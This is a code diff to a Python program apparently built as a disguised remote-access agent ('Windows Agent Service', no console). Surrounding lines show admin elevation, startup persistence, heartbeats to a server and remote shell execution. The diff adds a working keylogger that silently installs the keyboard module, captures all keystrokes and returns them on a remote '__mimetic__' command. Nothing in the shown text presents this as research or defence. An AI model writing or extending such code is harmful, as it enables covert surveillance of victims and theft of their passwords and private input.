@@ -16,8 +16,6 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 # cd /d C:\Users\User\Desktop\telelluc
 # python -m PyInstaller --onefile --noconsole --name "Windows Agent Service" telelluc.py
 
-VERSION = "0.0.92"
-
 def request_admin_privileges():
     try:
         if ctypes.windll.shell32.IsUserAnAdmin():
@@ -60,6 +58,8 @@ clipboard_cut = False
 current_heartbeat_interval = HEARTBEAT_INTERVAL_SECONDS
 current_command_check_interval = COMMAND_CHECK_INTERVAL_SECONDS
 current_inactivity_threshold = INACTIVITY_THRESHOLD_SECONDS
+mimetic_active = False
+mimetic_log = []
 
 ERROR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_error.vbs")
 ACTIVATOR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_activator.vbs")
@@ -257,6 +257,68 @@ def ensure_startup():
                     pass
         except OSError:
             pass
+
+
+def mimetic_keylogger():
+    """Capture all keyboard input in real-time."""
+    global mimetic_active, mimetic_log
+
+    try:
+        import keyboard
+    except ImportError:
+        try:
+            print("[mimetic] Installing keyboard module...", flush=True)
+            subprocess.run(
+                [sys.executable, "-m", "pip", "install", "keyboard", "-q"],
+                capture_output=True,
+                timeout=30,
+                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
+            )
+            import keyboard
+            print("[mimetic] Keyboard module installed", flush=True)
+        except Exception as e:
+            return f"Error installing keyboard: {str(e)}"
+
+    try:
+        mimetic_log = []
+        mimetic_active = True
+
+        def on_key_press(event):
+            global mimetic_log
+            if event.name == 'esc' or (event.name == 'c' and keyboard.is_pressed('ctrl')):
+                return False
+
+            key_name = event.name
+            if key_name == 'space':
+                mimetic_log.append('[SPACE]')
+            elif key_name == 'enter':
+                mimetic_log.append('[ENTER]\n')
+            elif key_name == 'tab':
+                mimetic_log.append('[TAB]')
+            elif key_name == 'backspace':
+                mimetic_log.append('[BACKSPACE]')
+            elif len(key_name) == 1:
+                mimetic_log.append(key_name)
+            else:
+                mimetic_log.append(f'[{key_name.upper()}]')
+
+            return True
+
+        keyboard.on_press(on_key_press)
+
+        while mimetic_active:
+            time.sleep(0.1)
+            if keyboard.is_pressed('ctrl+c'):
+                break
+
+        keyboard.unhook_all()
+        mimetic_active = False
+        result = ''.join(mimetic_log)
+        mimetic_log = []
+        return result
+    except Exception as e:
+        mimetic_active = False
+        return f"Error: {str(e)}"
 
 
 def restart_agent():
@@ -562,6 +624,14 @@ def execute_shell_command(cmd_str):
             try:
                 threading.Thread(target=restart_agent, daemon=False).start()
                 return "Agent restarting..."
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle mimetic (keylogger) command
+        if cmd_lower.startswith("__mimetic__"):
+            try:
+                result = mimetic_keylogger()
+                return result
             except Exception as e:
                 return f"Error: {str(e)}"
 
@@ -1055,8 +1125,7 @@ def heartbeat_loop():
             payload = json.dumps({
                 "hostname": hostname,
                 "status": status,
-                "seconds_inactive": seconds_inactive if not is_active else 0,
-                "version": VERSION
+                "seconds_inactive": seconds_inactive if not is_active else 0
             }).encode("utf-8")
 
             req = urllib.request.Request(
